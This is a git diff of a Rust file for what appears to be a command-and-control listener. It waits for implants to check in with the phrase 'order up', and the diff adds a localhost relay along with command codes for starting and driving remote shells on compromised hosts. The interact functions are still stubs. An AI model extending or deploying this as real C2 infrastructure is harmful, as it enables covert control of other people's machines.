@@ -1,8 +1,7 @@
 use std::process::Command;
 use std::net::{UdpSocket, SocketAddr, TcpListener, TcpStream, Shutdown};
 use std::io::{Read, Write};
-use std::sync::mpsc::{Receiver, Sender};
-
+use std::format;
 
 //pub struct info {
 //  arch: String,
@@ -29,18 +28,21 @@ pub fn new_lsn(i: u64) -> Listener {
     return ret;
 }
 
-pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, tx: Sender<&str>, rx: Receiver<&str>){
+pub fn lsn_run(lsn: &mut Listener, protocol: &str, address: SocketAddr, port: u16){
     match protocol {
-        "udp" => listen_udp(lsn, address, tx, rx),
-        "tcp" => listen_tcp(lsn, address, tx, rx),
-        "http" => listen_tcp(lsn, address, tx, rx),
-        "dns" => listen_udp(lsn, address, tx, rx),
+        "udp" => listen_udp(lsn, address, port),
+        "tcp" => listen_tcp(lsn, address, port),
+        "http" => listen_tcp(lsn, address, port),
+        "dns" => listen_udp(lsn, address, port),
         &_ => todo!(),
     }
 }
 
 // listens using a TcpListener
-fn listen_tcp(lsn: &mut Listener, address: SocketAddr, tx: Sender<&str>, rx: Receiver<&str>){
+fn listen_tcp(lsn: &mut Listener, address: SocketAddr, port: u16){
+    // Sets up the socket to relay data to the client over localhost
+    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();
+
     lsn.status = 1;
     lsn.tcp_sock = Some(TcpListener::bind(address).unwrap());
     println!("[+] Opening tcp listener on port {}", address.port());
@@ -55,7 +57,7 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, tx: Sender<&str>, rx: Rec
                 if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
                     lsn.status = 2;
                     // switches to interact mode
-                    interact_tcp(lsn, &mut stream);
+                    interact_tcp(lsn, &mut stream, &mut relay);
                     lsn.status = 1;
                 }
                 stream.shutdown(Shutdown::Both).expect("shutdown call failed");
@@ -67,11 +69,17 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, tx: Sender<&str>, rx: Rec
 }
 
 // listens using a UdpSocket
-fn listen_udp(lsn: &mut Listener, address: SocketAddr, tx: Sender<&str>, rx: Receiver<&str>){
+fn listen_udp(lsn: &mut Listener, address: SocketAddr, port: u16){
+    // Sets up the socket to relay data to the client over localhost
+    let mut relay = UdpSocket::bind(SocketAddr::from(([127, 0, 0, 1], port))).unwrap();
+
+    // Setup socket to listen for implant connection
     lsn.status = 1;
     lsn.udp_sock = Some(UdpSocket::bind(address).unwrap());
     println!("[+] Opening udp listener on port {}", address.port());
     loop { // break loop if connection is made
+        // Checks for commands from the client each iteration
+
         let mut buffer = [0; 2048];
         let (bytes, src) = lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer).unwrap();
 
@@ -79,21 +87,56 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, tx: Sender<&str>, rx: Rec
         if bytes != 0 && String::from_utf8_lossy(&buffer[..]).contains("order up") {
             lsn.status = 2;
             // switches to interact mode
-            interact_udp(lsn, src);
+            interact_udp(lsn, src, &mut relay);
             lsn.status = 1;
         }
     }
     lsn.status = 0;
 }
 
-fn interact_udp(lsn: &mut Listener, target: SocketAddr) {
+fn interact_udp(lsn: &mut Listener, target: SocketAddr, relay: &mut UdpSocket) {
     println!("[+] Connection established by listener {}", lsn.id);
     // TODO
 }
 
-fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream) {
+fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, relay: &mut UdpSocket) {
     println!("[+] Connection established by listener {}", lsn.id);
     // TODO
+}
+
+// recieves a single byte from the client: the command code
+// this command code, represented as an integer, determines
+// what the client wants the listener to do
+// 0 => no command recieved, do nothing
+// 1 => send all information about the listener
+// 2 => stop listening
+// 3 => terminate anchovy connection
+// 4 => prepare to send_cmd to an anchovy
+// 5 => begin shell on anchovy
+// 6 => interact with shell on anchovy
+// 7 => terminate shell on anchovy
+fn rcv_client_command(lsn: &mut Listener, relay: UdpSocket) -> u8 {
+    let mut buffer = [0; 1];
+    let (_bytes, _src) = relay.recv_from(&mut buffer).unwrap();
+    // only action needed to be taken inside this function is to send back listener info
+    if buffer[0] == 1 {
+        let mut lsn_info = get_lsn_info(lsn);
+    }
+    return buffer[0];
+}
+
+// Returns a string containing the full info of a given listener
+pub fn get_lsn_info(lsn: &mut Listener) -> String {
+    let mut stat: &str;
+    match lsn.status {
+        0 => stat = "Idle",
+        1 => stat = "Listening",
+        2 => stat = "Bound",
+        3_u8..=u8::MAX => todo!(),
+    }
+    let id: u64 = lsn.id;
+    let mut lsn_info = format!("Listener {id} :: Status - {stat}");
+    return lsn_info;
 }
 
 // creates a shell on the target
